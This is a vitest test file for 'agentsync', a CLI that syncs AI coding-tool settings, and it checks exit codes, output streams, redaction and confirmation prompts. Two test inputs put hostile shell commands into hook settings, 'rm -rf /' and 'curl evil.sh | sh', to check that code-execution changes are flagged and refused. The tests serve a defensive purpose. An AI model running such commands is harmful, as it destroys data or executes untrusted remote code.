/**
 * Command handlers driven as functions.
 *
 * Every case here goes through `run()` with an injected `CliDeps` — no
 * subprocess, no temp directory, no real host. What is asserted is the contract
 * a user or a script sees: the exit code, which stream the bytes went to, and
 * whether anything was written.
 */

import { describe, expect, it } from 'vitest'

import { StalePlanError } from '../../core/apply-engine.js'
import { EXIT } from '../exit.js'
import { desiredPath, statePath } from '../state.js'
import {
  ANSI_PRESENT,
  STATE_DIR,
  SETTINGS_PATH,
  TEST_DEVICE_ID,
  desiredFile,
  makeDeps,
  makeFakeAdapter,
  makeHost,
  makeRefusingAdapter,
  rollbackRecord,
  runCli,
  stateFile,
  type MakeDepsOptions,
} from './harness.js'

const SD = ['--state-dir', STATE_DIR]

const INSTALLED = { 'claude-code:user:settings': { model: 'sonnet' } }

/** A CLI with the fake tool installed and the given desired layers on disk. */
function withDesired(layers: Array<{ id: string; data: unknown }>, options: MakeDepsOptions = {}) {
  return makeDeps({
    adapters: [makeFakeAdapter({ docs: INSTALLED, ...(options.adapters ? {} : {}) })],
    files: { [desiredPath(STATE_DIR, 'claude-code')]: desiredFile(layers) },
    ...options,
  })
}

// ---------------------------------------------------------------------------
// Usage and help
// ---------------------------------------------------------------------------

describe('usage', () => {
  it('prints help and exits 0 with no arguments', async () => {
    const env = makeDeps()
    expect(await runCli([], env)).toBe(EXIT.OK)
    expect(env.stdout.text).toContain('USAGE')
    expect(env.stderr.text).toBe('')
  })

  it('exits 2 for an unknown command and writes the error to stderr', async () => {
    const env = makeDeps()
    expect(await runCli(['nope'], env)).toBe(EXIT.USAGE)
    expect(env.stdout.text).toBe('')
    expect(env.stderr.text).toContain('Unknown command')
  })

  it('exits 2 for an unknown flag rather than ignoring it', async () => {
    const env = makeDeps()
    expect(await runCli(['apply', '--dry-runn'], env)).toBe(EXIT.USAGE)
    expect(env.stderr.text).toContain('--dry-run')
  })

  it('honours --json on a usage error so scripts can still parse the failure', async () => {
    const env = makeDeps()
    expect(await runCli(['nope', '--json'], env)).toBe(EXIT.USAGE)
    const doc = JSON.parse(env.stdout.text) as { ok: boolean; exitCode: number }
    expect(doc.ok).toBe(false)
    expect(doc.exitCode).toBe(EXIT.USAGE)
  })

  it('prints the version', async () => {
    const env = makeDeps()
    expect(await runCli(['--version'], env)).toBe(EXIT.OK)
    expect(env.stdout.text.trim()).toBe('9.9.9')
  })

  it('renders per-command help for --help', async () => {
    const env = makeDeps()
    expect(await runCli(['apply', '--help'], env)).toBe(EXIT.OK)
    expect(env.stdout.text).toContain('agentsync apply')
    expect(env.stdout.text).toContain('--dry-run')
  })
})

// ---------------------------------------------------------------------------
// Colour and TTY
// ---------------------------------------------------------------------------

describe('colour and TTY', () => {
  it('emits no escape sequences when stdout is a pipe', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })], stdoutIsTTY: false })
    await runCli(['status', ...SD], env)
    expect(env.stdout.text).not.toMatch(ANSI_PRESENT)
    expect(env.stderr.text).not.toMatch(ANSI_PRESENT)
  })

  it('emits escape sequences on a TTY', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })], stdoutIsTTY: true })
    await runCli(['status', ...SD], env)
    expect(env.stdout.text).toMatch(ANSI_PRESENT)
  })

  it('suppresses colour when NO_COLOR is set, even on a TTY', async () => {
    const env = makeDeps({
      adapters: [makeFakeAdapter({ docs: INSTALLED })],
      stdoutIsTTY: true,
      env: { NO_COLOR: '1' },
    })
    await runCli(['status', ...SD], env)
    expect(env.stdout.text).not.toMatch(ANSI_PRESENT)
  })

  it('suppresses colour for --no-color', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })], stdoutIsTTY: true })
    await runCli(['status', '--no-color', ...SD], env)
    expect(env.stdout.text).not.toMatch(ANSI_PRESENT)
  })

  it('never colours --json output, even on a TTY', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })], stdoutIsTTY: true })
    await runCli(['status', '--json', ...SD], env)
    expect(env.stdout.text).not.toMatch(ANSI_PRESENT)
    expect(() => JSON.parse(env.stdout.text)).not.toThrow()
  })

  it('keeps a usage error uncoloured when --no-color parsed but the command did not', async () => {
    const env = makeDeps({ stdoutIsTTY: true })
    await runCli(['bogus', '--no-color'], env)
    expect(env.stderr.text).not.toMatch(ANSI_PRESENT)
  })
})

// ---------------------------------------------------------------------------
// init
// ---------------------------------------------------------------------------

describe('init', () => {
  it('creates local state and reports what it found', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })] })
    expect(await runCli(['init', ...SD], env)).toBe(EXIT.OK)
    expect(env.fs.files.has(statePath(STATE_DIR))).toBe(true)
    expect(env.stdout.text).toContain('Claude Code')
    expect(env.stdout.text).toContain(TEST_DEVICE_ID)
  })

  it('is idempotent and does not clobber a renamed device', async () => {
    const env = makeDeps({
      adapters: [makeFakeAdapter({ docs: INSTALLED })],
      files: {
        [statePath(STATE_DIR)]: stateFile([
          {
            deviceId: TEST_DEVICE_ID,
            label: 'work laptop',
            os: 'macos',
            runtime: 'native',
            arch: 'arm64',
            shell: 'zsh',
            firstSeenAt: '2026-01-01T00:00:00.000Z',
            lastSeenAt: '2026-01-01T00:00:00.000Z',
          },
        ]),
      },
    })
    expect(await runCli(['init', ...SD], env)).toBe(EXIT.OK)
    const state = JSON.parse(env.fs.files.get(statePath(STATE_DIR)) as string) as {
      devices: Array<{ label: string }>
    }
    expect(state.devices).toHaveLength(1)
    expect(state.devices[0]?.label).toBe('work laptop')
  })

  it('--adopt files the current config into layers and never adopts secrets', async () => {
    const env = makeDeps({
      adapters: [
        makeFakeAdapter({
          docs: {
            'claude-code:user:settings': {
              model: 'opus',
              hooks: { PreToolUse: ['echo hi'] },
              oauthAccount: { emailAddress: 'a@b.c' },
            },
          },
        }),
      ],
    })
    expect(await runCli(['init', '--adopt', ...SD], env)).toBe(EXIT.OK)
    const written = env.fs.files.get(desiredPath(STATE_DIR, 'claude-code')) as string
    expect(written).toBeDefined()
    expect(written).not.toContain('a@b.c')
    const parsed = JSON.parse(written) as { layers: Array<{ id: string }> }
    expect(parsed.layers.map((l) => l.id)).toEqual(['base', 'os:macos'])
  })

  it('emits one JSON document with --json', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })] })
    await runCli(['init', '--json', ...SD], env)
    const doc = JSON.parse(env.stdout.text) as { command: string; stateDir: string }
    expect(doc.command).toBe('init')
    expect(doc.stateDir).toBe(STATE_DIR)
  })
})

// ---------------------------------------------------------------------------
// status
// ---------------------------------------------------------------------------

describe('status', () => {
  it('exits 3 when nothing is configured yet', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })] })
    expect(await runCli(['status', ...SD], env)).toBe(EXIT.NOTHING_TO_DO)
    expect(env.stdout.text).toContain('No desired state')
  })

  it('reports drift against desired state', async () => {
    const env = withDesired([{ id: 'base', data: { model: 'opus' } }])
    expect(await runCli(['status', ...SD], env)).toBe(EXIT.OK)
    expect(env.stdout.text).toContain('Drift')
    expect(env.stdout.text).toContain('1 change')
  })

  it('calls out stores that are write-blocked by provenance', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })] })
    await runCli(['status', ...SD], env)
    expect(env.stdout.text).toContain('provenance: inferred')
    expect(env.stdout.text).toContain('claude-code:user:keybindings')
  })

  it('exits 4 when every write target on this OS is unverified', async () => {
    const env = makeDeps({
      adapters: [makeFakeAdapter({ docs: INSTALLED, primaryInferred: true })],
      files: { [desiredPath(STATE_DIR, 'claude-code')]: desiredFile([{ id: 'base', data: { model: 'opus' } }]) },
    })
    expect(await runCli(['status', ...SD], env)).toBe(EXIT.BLOCKED_BY_PROVENANCE)
  })
})

// ---------------------------------------------------------------------------
// diff
// ---------------------------------------------------------------------------

describe('diff', () => {
  it('exits 3 with no desired state', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })] })
    expect(await runCli(['diff', ...SD], env)).toBe(EXIT.NOTHING_TO_DO)
  })

  it('exits 3 when already in the desired state', async () => {
    const env = withDesired([{ id: 'base', data: { model: 'sonnet' } }])
    expect(await runCli(['diff', ...SD], env)).toBe(EXIT.NOTHING_TO_DO)
    expect(env.stdout.text).toContain('already in the desired state')
  })

  it('renders the change with its path and risk', async () => {
    const env = withDesired([{ id: 'base', data: { model: 'opus' } }])
    expect(await runCli(['diff', ...SD], env)).toBe(EXIT.OK)
    expect(env.stdout.text).toContain('model')
    expect(env.stdout.text).toContain('"opus"')
    expect(env.stdout.text).toContain('[safe]')
  })

  it('makes a code-execution change unmissable without relying on colour', async () => {
    const env = withDesired([{ id: 'os:macos', data: { hooks: { PreToolUse: ['rm -rf /'] } } }])
    await runCli(['diff', ...SD], env)
    const text = env.stdout.text
    expect(text).not.toMatch(ANSI_PRESENT)
    expect(text).toContain('CODE EXECUTION')
    expect(text).toContain('RUN CODE on this machine')
    expect(text).toContain('hooks.PreToolUse')
  })

  it('redacts secret-shaped values in the human diff', async () => {
    const env = withDesired([{ id: 'base', data: { database: { password: 'hunter2' } } }])
    await runCli(['diff', ...SD], env)
    expect(env.stdout.text).toContain('database.password')
    expect(env.stdout.text).not.toContain('hunter2')
    expect(env.stdout.text).toContain('[redacted]')
    expect(env.stdout.text).toContain('secret-shaped keys are never printed')
  })

  it('redacts secret-shaped values in --json output too', async () => {
    const env = withDesired([{ id: 'base', data: { database: { password: 'hunter2' } } }])
    await runCli(['diff', '--json', ...SD], env)
    expect(env.stdout.text).not.toContain('hunter2')
    const doc = JSON.parse(env.stdout.text) as { changes: Array<{ after: unknown; risk: string }> }
    expect(doc.changes[0]?.after).toBe('[redacted]')
  })

  it('emits exactly one JSON document', async () => {
    const env = withDesired([{ id: 'base', data: { model: 'opus' } }])
    await runCli(['diff', '--json', ...SD], env)
    expect(env.stdout.text.trimEnd().split('\n}\n').length).toBe(1)
    const doc = JSON.parse(env.stdout.text) as { planId: string; summary: { total: number } }
    expect(doc.summary.total).toBe(1)
    expect(doc.planId).toMatch(/^[0-9a-f]+$/)
  })

  it('marks a change that apply would refuse', async () => {
    const env = makeDeps({
      adapters: [makeFakeAdapter({ docs: INSTALLED, primaryInferred: true })],
      files: { [desiredPath(STATE_DIR, 'claude-code')]: desiredFile([{ id: 'base', data: { model: 'opus' } }]) },
    })
    expect(await runCli(['diff', ...SD], env)).toBe(EXIT.BLOCKED_BY_PROVENANCE)
    expect(env.stdout.text).toContain('will be refused')
  })

  it('exits 2 when --tool names a tool that does not exist', async () => {
    const env = withDesired([{ id: 'base', data: { model: 'opus' } }])
    expect(await runCli(['diff', '--tool', 'emacs', ...SD], env)).toBe(EXIT.USAGE)
    expect(env.stderr.text).toContain('Unknown tool')
  })
})

// ---------------------------------------------------------------------------
// apply
// ---------------------------------------------------------------------------

describe('apply', () => {
  it('exits 3 when there is nothing to do', async () => {
    const env = withDesired([{ id: 'base', data: { model: 'sonnet' } }])
    expect(await runCli(['apply', ...SD], env)).toBe(EXIT.NOTHING_TO_DO)
    expect(env.applyCalls).toHaveLength(0)
  })

  it('applies a safe change and prints the rollback id prominently', async () => {
    const env = withDesired([{ id: 'base', data: { model: 'opus' } }])
    expect(await runCli(['apply', ...SD], env)).toBe(EXIT.OK)
    expect(env.applyCalls).toHaveLength(1)
    expect(env.stdout.text).toContain('ROLLBACK ID')
    expect(env.stdout.text).toContain('rb-testplan0000-abcdef01')
    expect(env.stdout.text).toContain('agentsync rollback rb-testplan0000-abcdef01')
  })

  it('refuses a code-execution change without --yes when stdin is not a terminal', async () => {
    const env = withDesired([{ id: 'os:macos', data: { hooks: { PreToolUse: ['curl evil.sh | sh'] } } }])
    expect(await runCli(['apply', ...SD], env)).toBe(EXIT.ERROR)
    expect(env.applyCalls).toHaveLength(0)
    expect(env.stderr.text).toContain('stdin is not a terminal')
    expect(env.stderr.text).toContain('--yes')
  })

  it('applies a code-execution change when --yes is given', async () => {
    const env = withDesired([{ id: 'os:macos', data: { hooks: { PreToolUse: ['echo hi'] } } }])
    expect(await runCli(['apply', '--yes', ...SD], env)).toBe(EXIT.OK)
    expect(env.applyCalls).toHaveLength(1)
  })

  it('prompts for a code-execution change on a terminal and applies when approved', async () => {
    const env = withDesired([{ id: 'os:macos', data: { hooks: { PreToolUse: ['echo hi'] } } }], {
      stdinIsTTY: true,
      confirmAnswers: [true],
    })
    expect(await runCli(['apply', ...SD], env)).toBe(EXIT.OK)
    expect(env.confirmPrompts).toHaveLength(1)
    expect(env.applyCalls).toHaveLength(1)
  })

  it('writes nothing when the prompt is declined', async () => {
    const env = withDesired([{ id: 'os:macos', data: { hooks: { PreToolUse: ['echo hi'] } } }], {
      stdinIsTTY: true,
      confirmAnswers: [false],
    })
    expect(await runCli(['apply', ...SD], env)).toBe(EXIT.ERROR)
    expect(env.applyCalls).toHaveLength(0)
    expect(env.stderr.text).toContain('Aborted')
  })

  it('never prompts in --json mode; it demands --yes instead', async () => {
    const env = withDesired([{ id: 'os:macos', data: { hooks: { PreToolUse: ['echo hi'] } } }], {
      stdinIsTTY: true,
      confirmAnswers: [true],
    })
    expect(await runCli(['apply', '--json', ...SD], env)).toBe(EXIT.ERROR)
    expect(env.confirmPrompts).toHaveLength(0)
    expect(env.applyCalls).toHaveLength(0)
    const doc = JSON.parse(env.stdout.text) as { error: { hint: string } }
    expect(doc.error.hint).toContain('--yes')
  })

  it('--dry-run writes nothing and does not prompt', async () => {
    const env = withDesired([{ id: 'os:macos', data: { hooks: { PreToolUse: ['echo hi'] } } }], {
      stdinIsTTY: true,
      confirmAnswers: [true],
    })
    expect(await runCli(['apply', '--dry-run', ...SD], env)).toBe(EXIT.OK)
    expect(env.applyCalls).toHaveLength(0)
    expect(env.confirmPrompts).toHaveLength(0)
    expect(env.stdout.text).toContain('Dry run')
  })

  it('exits 4 when every change is blocked by unverified provenance', async () => {
    const env = makeDeps({
      adapters: [makeFakeAdapter({ docs: INSTALLED, primaryInferred: true })],
      files: { [desiredPath(STATE_DIR, 'claude-code')]: desiredFile([{ id: 'base', data: { model: 'opus' } }]) },
    })
    expect(await runCli(['apply', ...SD], env)).toBe(EXIT.BLOCKED_BY_PROVENANCE)
    expect(env.applyCalls).toHaveLength(0)
    expect(env.stdout.text).toContain('unverified')
  })

  it('turns StalePlanError into an instruction to re-run diff', async () => {
    const env = withDesired([{ id: 'base', data: { model: 'opus' } }], {
      applyThrows: new StalePlanError('claude-code:user:settings', 'aaaaaaaaaaaa', 'bbbbbbbbbbbb'),
    })
    expect(await runCli(['apply', ...SD], env)).toBe(EXIT.ERROR)
    expect(env.stderr.text).toContain('changed on disk')
    expect(env.stderr.text).toContain('agentsync diff')
  })

  it('reports an adapter that deliberately refuses to apply', async () => {
    const refusing = makeRefusingAdapter('cursor')
    const env = makeDeps({
      adapters: [refusing],
      host: makeHost(),
      files: { [desiredPath(STATE_DIR, 'cursor')]: desiredFile([{ id: 'base', data: { model: 'opus' } }]) },
    })
    expect(await runCli(['apply', '--tool', 'cursor', ...SD], env)).toBe(EXIT.ERROR)
    expect(env.stderr.text).toContain('cannot be applied by this build yet')
    expect(env.stderr.text).toContain('comment')
  })

  it('refuses to write an unresolvable secret reference', async () => {
    const env = withDesired([{ id: 'base', data: { model: '${secret:the.model}' } }])
    expect(await runCli(['apply', '--yes', ...SD], env)).toBe(EXIT.ERROR)
    expect(env.applyCalls).toHaveLength(0)
    expect(env.stderr.text).toContain('secret reference')
  })

  it('reports failures as exit 1 and lists them', async () => {
    const env = withDesired([{ id: 'base', data: { model: 'opus' } }], {
      applyResult: {
        applied: [],
        failed: [
          {
            storeId: 'claude-code:user:settings',
            op: 'update',
            path: 'model',
            reason: 'x',
            risk: 'none',
            error: 'disk full',
          },
        ],
        rollbackId: '',
      },
    })
    expect(await runCli(['apply', ...SD], env)).toBe(EXIT.ERROR)
    expect(env.stdout.text).toContain('disk full')
  })
})

// ---------------------------------------------------------------------------
// rollback
// ---------------------------------------------------------------------------

describe('rollback', () => {
  const base: MakeDepsOptions = { adapters: [makeFakeAdapter({ docs: INSTALLED })] }

  it('exits 3 when there is nothing to roll back', async () => {
    const env = makeDeps(base)
    expect(await runCli(['rollback', '--list', ...SD], env)).toBe(EXIT.NOTHING_TO_DO)
  })

  it('lists rollback points newest first', async () => {
    const env = makeDeps({ ...base, rollbacks: [rollbackRecord()] })
    expect(await runCli(['rollback', '--list', ...SD], env)).toBe(EXIT.OK)
    expect(env.stdout.text).toContain('rb-abc123def456-01234567')
  })

  it('shows the affected files under --verbose', async () => {
    const env = makeDeps({ ...base, rollbacks: [rollbackRecord()] })
    await runCli(['rollback', '--list', '--verbose', ...SD], env)
    expect(env.stdout.text).toContain(SETTINGS_PATH)
  })

  it('lists the affected files in --json without needing --verbose', async () => {
    const env = makeDeps({ ...base, rollbacks: [rollbackRecord()] })
    await runCli(['rollback', '--list', '--json', ...SD], env)
    const doc = JSON.parse(env.stdout.text) as { rollbacks: Array<{ files: string[] }> }
    expect(doc.rollbacks[0]?.files).toEqual([SETTINGS_PATH])
  })

  it('restores by full id', async () => {
    const env = makeDeps({ ...base, rollbacks: [rollbackRecord()] })
    expect(await runCli(['rollback', 'rb-abc123def456-01234567', ...SD], env)).toBe(EXIT.OK)
    expect(env.rollbackCalls).toEqual(['rb-abc123def456-01234567'])
  })

  it('restores by unique prefix', async () => {
    const env = makeDeps({ ...base, rollbacks: [rollbackRecord()] })
    expect(await runCli(['rollback', 'rb-abc123', ...SD], env)).toBe(EXIT.OK)
    expect(env.rollbackCalls).toHaveLength(1)
  })

  it('rejects an ambiguous prefix instead of guessing', async () => {
    const env = makeDeps({
      ...base,
      rollbacks: [rollbackRecord(), rollbackRecord({ rollbackId: 'rb-abc123ffffff-76543210' })],
    })
    expect(await runCli(['rollback', 'rb-abc123', ...SD], env)).toBe(EXIT.USAGE)
    expect(env.rollbackCalls).toHaveLength(0)
  })

  it('lists what does exist when the id is unknown', async () => {
    const env = makeDeps({ ...base, rollbacks: [rollbackRecord()] })
    expect(await runCli(['rollback', 'rb-nope', ...SD], env)).toBe(EXIT.ERROR)
    expect(env.stderr.text).toContain('rb-abc123def456-01234567')
  })

  it('exits 2 when neither an id nor --list is given', async () => {
    const env = makeDeps(base)
    expect(await runCli(['rollback', ...SD], env)).toBe(EXIT.USAGE)
  })

  it('confirms first on a terminal', async () => {
    const env = makeDeps({ ...base, rollbacks: [rollbackRecord()], stdinIsTTY: true, confirmAnswers: [false] })
    expect(await runCli(['rollback', 'rb-abc123def456-01234567', ...SD], env)).toBe(EXIT.ERROR)
    expect(env.rollbackCalls).toHaveLength(0)
  })
})

// ---------------------------------------------------------------------------
// devices
// ---------------------------------------------------------------------------

describe('devices', () => {
  it('exits 3 before init has recorded anything', async () => {
    const env = makeDeps()
    expect(await runCli(['devices', ...SD], env)).toBe(EXIT.NOTHING_TO_DO)
  })

  it('marks the local device in the list', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })] })
    await runCli(['init', ...SD], env)
    expect(await runCli(['devices', ...SD], env)).toBe(EXIT.OK)
    expect(env.stdout.text).toContain('test-box')
    expect(env.stdout.text).toContain(TEST_DEVICE_ID)
  })

  it('says out loud that these are local records only', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })] })
    await runCli(['init', ...SD], env)
    await runCli(['devices', ...SD], env)
    expect(env.stdout.text).toContain('no control plane yet')
  })

  it('renames this device via "."', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })] })
    await runCli(['init', ...SD], env)
    expect(await runCli(['devices', 'rename', '.', 'work laptop', ...SD], env)).toBe(EXIT.OK)
    const state = JSON.parse(env.fs.files.get(statePath(STATE_DIR)) as string) as {
      devices: Array<{ label: string }>
    }
    expect(state.devices[0]?.label).toBe('work laptop')
  })

  it('exits 2 when the device is unknown', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })] })
    await runCli(['init', ...SD], env)
    expect(await runCli(['devices', 'rename', 'nope', 'x', ...SD], env)).toBe(EXIT.USAGE)
  })

  it('exits 2 for an unknown subcommand', async () => {
    const env = makeDeps()
    expect(await runCli(['devices', 'delete', ...SD], env)).toBe(EXIT.USAGE)
  })

  it('reports serverBacked: false in --json so a client cannot assume a fleet view', async () => {
    const env = makeDeps({
      adapters: [makeFakeAdapter({ docs: INSTALLED })],
      files: {
        [statePath(STATE_DIR)]: stateFile([
          {
            deviceId: TEST_DEVICE_ID,
            label: 'test-box',
            os: 'macos',
            runtime: 'native',
            arch: 'arm64',
            shell: 'zsh',
            firstSeenAt: '2026-01-01T00:00:00.000Z',
            lastSeenAt: '2026-01-01T00:00:00.000Z',
          },
        ]),
      },
    })
    expect(await runCli(['devices', '--json', ...SD], env)).toBe(EXIT.OK)
    const doc = JSON.parse(env.stdout.text) as { serverBacked: boolean; devices: Array<{ isLocal: boolean }> }
    expect(doc.serverBacked).toBe(false)
    expect(doc.devices[0]?.isLocal).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// doctor
// ---------------------------------------------------------------------------

describe('doctor', () => {
  it('exits 0 on a healthy host and explains each capability', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })] })
    expect(await runCli(['doctor', ...SD], env)).toBe(EXIT.OK)
    const text = env.stdout.text
    expect(text).toContain('Host')
    expect(text).toContain('Capabilities')
    expect(text).toContain('Secret backend')
    expect(text).toContain('macos-keychain')
    expect(text).toContain('Verdict')
  })

  it('exits 4 when provenance blocks every write target', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED, primaryInferred: true })] })
    expect(await runCli(['doctor', ...SD], env)).toBe(EXIT.BLOCKED_BY_PROVENANCE)
    expect(env.stdout.text).toContain('BLOCKER')
    expect(env.stdout.text).toContain('conformance job')
  })

  it('exits 1 and names the file when a store cannot be parsed', async () => {
    const env = makeDeps({
      adapters: [
        makeFakeAdapter({
          docs: INSTALLED,
          readThrows: { 'claude-code:user:settings': 'not valid JSON/JSONC: Unexpected token }' },
        }),
      ],
    })
    expect(await runCli(['doctor', ...SD], env)).toBe(EXIT.ERROR)
    expect(env.stdout.text).toContain('could not be read')
    expect(env.stdout.text).toContain(SETTINGS_PATH)
  })

  it('explains a Windows host without Developer Mode', async () => {
    const env = makeDeps({
      host: makeHost({ os: 'windows', supportsSymlinks: false, supportsLongPaths: false, shell: 'powershell', home: 'C:\\Users\\t' }),
      platform: 'win32',
      adapters: [makeFakeAdapter({ docs: INSTALLED })],
    })
    await runCli(['doctor', ...SD], env)
    expect(env.stdout.text).toContain('Developer Mode')
    expect(env.stdout.text).toContain('LongPathsEnabled')
  })

  it('flags WSL as neither Linux nor Windows', async () => {
    const env = makeDeps({
      host: makeHost({ os: 'linux', runtime: 'wsl', hasKeyring: false, shell: 'bash' }),
      adapters: [makeFakeAdapter({ docs: INSTALLED })],
      env: { WSL_DISTRO_NAME: 'Ubuntu' },
    })
    await runCli(['doctor', ...SD], env)
    expect(env.stdout.text).toContain('WSL')
    expect(env.stdout.text).toContain('AGENTSYNC_VAULT_PASSPHRASE')
  })

  it('never prints a passphrase value', async () => {
    const env = makeDeps({
      adapters: [makeFakeAdapter({ docs: INSTALLED })],
      env: { AGENTSYNC_VAULT_PASSPHRASE: 'correct-horse-battery-staple' },
    })
    await runCli(['doctor', ...SD], env)
    expect(env.stdout.text).not.toContain('correct-horse-battery-staple')
    expect(env.stdout.text).toContain('value hidden')
  })

  it('reports why colour is off, because that is a real support question', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })], env: { NO_COLOR: '1' } })
    await runCli(['doctor', ...SD], env)
    expect(env.stdout.text).toContain('NO_COLOR is set')
  })

  it('produces a machine-readable report', async () => {
    const env = makeDeps({ adapters: [makeFakeAdapter({ docs: INSTALLED })] })
    await runCli(['doctor', '--json', ...SD], env)
    const doc = JSON.parse(env.stdout.text) as {
      host: { os: string }
      findings: Array<{ severity: string; remedy: string }>
      secrets: { chosen: string }
    }
    expect(doc.host.os).toBe('macos')
    expect(doc.secrets.chosen).toBe('macos-keychain')
    for (const f of doc.findings) expect(f.remedy.length).toBeGreaterThan(0)
  })
})

// ---------------------------------------------------------------------------
// stream discipline
// ---------------------------------------------------------------------------

describe('stream discipline', () => {
  it('sends human output to stdout and diagnostics to stderr', async () => {
    const env = withDesired([{ id: 'base', data: { model: 'opus' } }])
    await runCli(['diff', ...SD], env)
    expect(env.stdout.text).toContain('model')
    expect(env.stderr.text).toBe('')
  })

  it('keeps stdout pure JSON while still reporting the failure on stderr', async () => {
    const env = withDesired([{ id: 'base', data: { model: 'opus' } }], {
      applyThrows: new Error('boom'),
    })
    await runCli(['apply', '--json', ...SD], env)
    expect(() => JSON.parse(env.stdout.text)).not.toThrow()
    expect(env.stderr.text).toContain('boom')
  })

  it('--quiet drops the next-steps hints but keeps the answer', async () => {
    const loud = withDesired([{ id: 'base', data: { model: 'opus' } }])
    await runCli(['diff', ...SD], loud)
    const quiet = withDesired([{ id: 'base', data: { model: 'opus' } }])
    await runCli(['diff', '--quiet', ...SD], quiet)
    expect(loud.stdout.text).toContain('agentsync apply')
    expect(quiet.stdout.text).not.toContain('agentsync apply')
    expect(quiet.stdout.text).toContain('model')
  })
})
